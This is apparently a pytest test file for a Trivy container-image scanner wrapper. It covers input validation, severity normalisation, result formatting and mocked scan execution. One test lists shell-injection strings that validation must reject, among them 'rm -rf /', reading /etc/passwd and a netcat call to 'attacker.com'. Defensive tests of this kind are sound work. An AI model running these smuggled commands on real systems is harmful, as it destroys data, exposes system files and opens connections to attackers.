"""Tests for Trivy scanner."""

from __future__ import annotations

from unittest.mock import AsyncMock, patch

import pytest

from app.scanners.exceptions import (
    ScannerValidationError,
    ScannerExecutionError,
    ScannerTimeoutError,
)
from app.scanners.trivy import TrivyScanner


@pytest.fixture
def trivy_scanner() -> TrivyScanner:
    """Create Trivy scanner instance."""
    return TrivyScanner(timeout_seconds=60)


class TestTrivyScannerValidation:
    """Tests for TrivyScanner input validation."""

    def test_validate_valid_image(self, trivy_scanner: TrivyScanner) -> None:
        """Test validation of valid Docker image names."""
        valid_images = [
            {"image": "nginx:latest"},
            {"image": "python:3.11-slim"},
            {"image": "docker.io/library/alpine:3.18"},
            {"image": "ghcr.io/user/repo:v1.2.3"},
            {"image": "alpine"},
        ]

        for input_data in valid_images:
            assert trivy_scanner.validate_input(input_data) is True

    def test_validate_missing_image(self, trivy_scanner: TrivyScanner) -> None:
        """Test validation fails when image is missing."""
        with pytest.raises(ScannerValidationError, match="Missing required field"):
            trivy_scanner.validate_input({})

    def test_validate_empty_image(self, trivy_scanner: TrivyScanner) -> None:
        """Test validation fails for empty image name."""
        with pytest.raises(ScannerValidationError, match="Invalid image name"):
            trivy_scanner.validate_input({"image": ""})

        with pytest.raises(ScannerValidationError, match="Invalid image name"):
            trivy_scanner.validate_input({"image": "   "})

    def test_validate_shell_injection(self, trivy_scanner: TrivyScanner) -> None:
        """Test validation blocks shell injection attempts."""
        malicious_inputs = [
            {"image": "nginx; rm -rf /"},
            {"image": "nginx && cat /etc/passwd"},
            {"image": "nginx|nc attacker.com 4444"},
            {"image": "nginx`whoami`"},
            {"image": "nginx\nEXPOSE evil"},
            {"image": "nginx$(reboot)"},
        ]

        for input_data in malicious_inputs:
            with pytest.raises(ScannerValidationError, match="Invalid characters"):
                trivy_scanner.validate_input(input_data)

    def test_validate_too_long_image(self, trivy_scanner: TrivyScanner) -> None:
        """Test validation fails for excessively long image names."""
        long_image = "a" * 501
        with pytest.raises(ScannerValidationError, match="too long"):
            trivy_scanner.validate_input({"image": long_image})

    def test_validate_invalid_format(self, trivy_scanner: TrivyScanner) -> None:
        """Test validation fails for invalid Docker image format."""
        with pytest.raises(ScannerValidationError, match="Invalid Docker image format"):
            trivy_scanner.validate_input({"image": "UPPERCASE:INVALID"})

    def test_validate_non_dict_input(self, trivy_scanner: TrivyScanner) -> None:
        """Test validation fails for non-dict input."""
        with pytest.raises(ScannerValidationError, match="must be a dictionary"):
            trivy_scanner.validate_input("not a dict")  # type: ignore

    def test_validate_non_string_image(self, trivy_scanner: TrivyScanner) -> None:
        """Test validation fails for non-string image."""
        with pytest.raises(ScannerValidationError, match="must be a string"):
            trivy_scanner.validate_input({"image": 123})  # type: ignore


class TestTrivyScannerSeverityNormalization:
    """Tests for severity level normalization."""

    def test_normalize_severity_critical(self, trivy_scanner: TrivyScanner) -> None:
        """Test CRITICAL severity normalization."""
        assert trivy_scanner.normalize_severity("CRITICAL") == "CRITICAL"
        assert trivy_scanner.normalize_severity("Critical") == "CRITICAL"

    def test_normalize_severity_high(self, trivy_scanner: TrivyScanner) -> None:
        """Test HIGH severity normalization."""
        assert trivy_scanner.normalize_severity("HIGH") == "HIGH"
        assert trivy_scanner.normalize_severity("High") == "HIGH"

    def test_normalize_severity_medium(self, trivy_scanner: TrivyScanner) -> None:
        """Test MEDIUM severity normalization."""
        assert trivy_scanner.normalize_severity("MEDIUM") == "MEDIUM"
        assert trivy_scanner.normalize_severity("MODERATE") == "MEDIUM"

    def test_normalize_severity_low(self, trivy_scanner: TrivyScanner) -> None:
        """Test LOW severity normalization."""
        assert trivy_scanner.normalize_severity("LOW") == "LOW"

    def test_normalize_severity_info(self, trivy_scanner: TrivyScanner) -> None:
        """Test INFO severity normalization."""
        assert trivy_scanner.normalize_severity("INFO") == "INFO"
        assert trivy_scanner.normalize_severity("UNKNOWN") == "INFO"

    def test_normalize_severity_case_insensitive(self, trivy_scanner: TrivyScanner) -> None:
        """Test severity normalization is case-insensitive."""
        assert trivy_scanner.normalize_severity("critical") == "CRITICAL"
        assert trivy_scanner.normalize_severity("High") == "HIGH"


class TestTrivyScannerResultFormat:
    """Tests for unified result format creation."""

    def test_create_scan_result_empty_findings(self, trivy_scanner: TrivyScanner) -> None:
        """Test result format with no findings."""
        result = trivy_scanner.create_scan_result(
            scan_type="docker",
            scanner_version="trivy-0.55.0",
            findings=[],
            scan_duration=1.5,
        )

        assert result["scan_type"] == "docker"
        assert result["status"] == "completed"
        assert result["summary"]["critical"] == 0
        assert result["summary"]["high"] == 0
        assert result["summary"]["medium"] == 0
        assert result["summary"]["low"] == 0
        assert result["summary"]["info"] == 0
        assert len(result["findings"]) == 0

    def test_create_scan_result_with_findings(self, trivy_scanner: TrivyScanner) -> None:
        """Test result format with findings."""
        findings = [
            {"severity": "CRITICAL", "id": "CVE-2024-1234"},
            {"severity": "HIGH", "id": "CVE-2024-5678"},
            {"severity": "HIGH", "id": "CVE-2024-9999"},
            {"severity": "MEDIUM", "id": "CVE-2024-1111"},
        ]

        result = trivy_scanner.create_scan_result(
            scan_type="docker",
            scanner_version="trivy-0.55.0",
            findings=findings,
            scan_duration=2.3,
        )

        assert result["summary"]["critical"] == 1
        assert result["summary"]["high"] == 2
        assert result["summary"]["medium"] == 1
        assert result["summary"]["low"] == 0

    def test_create_scan_result_metadata(self, trivy_scanner: TrivyScanner) -> None:
        """Test result metadata includes expected fields."""
        result = trivy_scanner.create_scan_result(
            scan_type="docker",
            scanner_version="trivy-0.55.0",
            findings=[],
            scan_duration=1.0,
            metadata={"image": "nginx:latest"},
        )

        assert "metadata" in result
        assert "scanned_at" in result["metadata"]
        assert result["metadata"]["scanner_version"] == "trivy-0.55.0"
        assert result["metadata"]["scan_duration_seconds"] == 1.0
        assert result["metadata"]["image"] == "nginx:latest"


class TestTrivyScannerExecution:
    """Tests for TrivyScanner scan execution."""

    @pytest.mark.asyncio
    async def test_scan_success(self, trivy_scanner: TrivyScanner) -> None:
        """Test successful scan execution."""
        trivy_output = """
        [
          {
            "Target": "nginx:latest",
            "Vulnerabilities": [
              {
                "VulnerabilityID": "CVE-2024-1234",
                "Severity": "CRITICAL",
                "Title": "Critical vulnerability",
                "Description": "A critical security flaw",
                "PkgName": "openssl",
                "InstalledVersion": "1.1.1",
                "FixedVersion": "1.1.1k",
                "References": ["https://example.com/cve1"],
                "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2024-1234"
              }
            ]
          }
        ]
        """

        mock_result = type("MockResult", (), {"returncode": 0, "stdout": trivy_output, "stderr": ""})()

        with patch("asyncio.to_thread", new=AsyncMock(return_value=mock_result)):
            result = await trivy_scanner.scan({"image": "nginx:latest"})

            assert result["status"] == "completed"
            assert result["scan_type"] == "docker"
            assert len(result["findings"]) == 1
            assert result["findings"][0]["id"] == "CVE-2024-1234"
            assert result["findings"][0]["severity"] == "CRITICAL"

    @pytest.mark.asyncio
    async def test_scan_validation_failure(self, trivy_scanner: TrivyScanner) -> None:
        """Test scan fails on invalid input."""
        with pytest.raises(ScannerValidationError):
            await trivy_scanner.scan({"image": "invalid;format"})

    @pytest.mark.asyncio
    async def test_scan_timeout(self, trivy_scanner: TrivyScanner) -> None:
        """Test scan timeout handling."""
        from subprocess import TimeoutExpired

        with patch("asyncio.to_thread", side_effect=TimeoutExpired("trivy", 60)):
            with pytest.raises(ScannerTimeoutError):
                await trivy_scanner.scan({"image": "nginx:latest"})

    @pytest.mark.asyncio
    async def test_scan_execution_failure(self, trivy_scanner: TrivyScanner) -> None:
        """Test scan execution error handling."""
        from subprocess import CalledProcessError

        error = CalledProcessError(1, "trivy", stderr="Image not found")
        error.stdout = ""

        with patch("asyncio.to_thread", side_effect=error):
            with pytest.raises(ScannerExecutionError):
                await trivy_scanner.scan({"image": "nonexistent:latest"})
